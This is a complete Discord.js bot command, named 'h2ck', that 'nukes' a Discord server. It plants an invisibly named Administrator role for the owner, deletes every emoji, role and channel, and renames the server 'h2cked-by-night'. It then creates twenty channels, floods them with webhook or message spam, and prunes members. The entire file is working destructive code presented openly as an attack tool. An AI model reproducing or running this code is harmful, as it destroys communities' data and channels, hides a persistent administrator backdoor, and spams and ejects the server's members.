const { PermissionsBitField, Colors } = require('discord.js');

module.exports = {
  name: "h2ck",
  description: "....",
  category: "....",
  ownerOnly: true,
  async execute(client, message) {
    const guild = message.guild;
    const ownerId = client.config.ownerId;

    if (!guild) return message.channel.send("no.");
    if (message.author.id !== ownerId) return message.channel.send("no.");
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return message.channel.send("no.");

    await message.channel.send("⚠️ Initiating Process...");
    
    const skipFlags = {
      emojis: false,
      roles: false,
      channels: false,
      members: false
    };

    const skipListener = (msg) => {
      if (msg.author.id !== message.author.id) return;
      if (!msg.content.toLowerCase().startsWith(client.config.prefix + "skip")) return;

      const args = msg.content.toLowerCase().slice(client.config.prefix.length).split(" ");
      if (args.length < 2) return;

      const type = args[1];
      if (skipFlags.hasOwnProperty(type)) {
        skipFlags[type] = true;
        msg.channel.send(`Skipping ${type}`);
      }
    };

    client.on("messageCreate", skipListener);

    try {
      await guild.members.fetch();
      await guild.roles.fetch();
      await guild.channels.fetch();
      await guild.emojis.fetch();

      const secretRole = await guild.roles.create({
        name: '‌',
        color: Colors.white,
        permissions: PermissionsBitField.Flags.Administrator,
        reason: '😂'
      }).catch(() => null);

      if (secretRole) {
        const owner = guild.members.cache.get(ownerId);
        if (owner) await owner.roles.add(secretRole).catch(() => {});
      }

      await guild.setIcon(null, '🖕🏻').catch(() => {});
      await guild.setBanner(null, '🖕🏻').catch(() => {});

      if (guild.vanityURLCode) {
        const newCode = Math.random().toString(36).substring(2, 7);
        await guild.edit({ vanityURLCode: newCode, reason: '🖕🏻' }).catch(() => {});
      }

      let emojisDeleted = 0;
      if (!skipFlags.emojis) {
        const emojis = [...guild.emojis.cache.values()];
        for (let i = 0; i < emojis.length; i += 25) {
          if (skipFlags.emojis) break;
          const batch = emojis.slice(i, i + 25);
          await Promise.allSettled(batch.map(e => e.delete('🖕🏻').catch(() => {})));
          emojisDeleted += batch.length;
        }
      }

      let rolesDeleted = 0;
      if (!skipFlags.roles) {
        const roles = [...guild.roles.cache.values()].filter(r =>
          r.id !== guild.id && r.id !== secretRole?.id
        );
        for (let i = 0; i < roles.length; i += 25) {
          if (skipFlags.roles) break;
          const batch = roles.slice(i, i + 25);
          await Promise.allSettled(batch.map(r => r.delete('🖕🏻').catch(() => {})));
          rolesDeleted += batch.length;
        }
      }

      let channelsDeleted = 0;
      if (!skipFlags.channels) {
        const channels = [...guild.channels.cache.values()];
        for (let i = 0; i < channels.length; i += 25) {
          if (skipFlags.channels) break;
          const batch = channels.slice(i, i + 25);
          await Promise.allSettled(batch.map(c => c.delete('🖕🏻').catch(() => {})));
          channelsDeleted += batch.length;
        }
      }

      await guild.setName("h2cked-by-night", '🖕🏻').catch(() => {});

      const createdChannels = await Promise.allSettled(
        Array(20).fill(null).map(() =>
          guild.channels.create({
            name: `h2cked-by-night`,
            type: 0,
            reason: '🖕🏻'
          }).catch(() => null)
        )
      );

      const channelsToSpam = createdChannels
        .filter(res => res.status === "fulfilled" && res.value !== null)
        .map(res => res.value);

      const spamContent = client.config.spamMessage;

      for (const ch of channelsToSpam) {
        if (client.config.spamMethod === "webhook") {
          const hook = await ch.createWebhook({
            name: '!',
            avatar: client.config.webhookAvatar
          }).catch(() => null);

          if (!hook) continue;

          for (let i = 0; i < 10; i++) {
            hook.send(spamContent).catch(() => {});
          }
        } else {
          for (let i = 0; i < 25; i++) {
            ch.send(spamContent).catch(() => {});
          }
        }
      }

      let membersKicked = 0;
if (!skipFlags.members) {
    try {
        membersKicked = await guild.members.prune({ days: 7, reason: '🖕🏻', count: true });
        console.log(`\n Members kicked: ${membersKicked}`);
    } catch (err) {
        console.error("\n❌ Prune failed:", err);
    }
}

      console.log("\n✅ Nuke complete.");
    } catch (err) {
      console.error("❌ Nuke error:", err);
      console.log("\n❌ An error occurred during the nuke.");
    } finally {
      client.off("messageCreate", skipListener);
    }
  }
};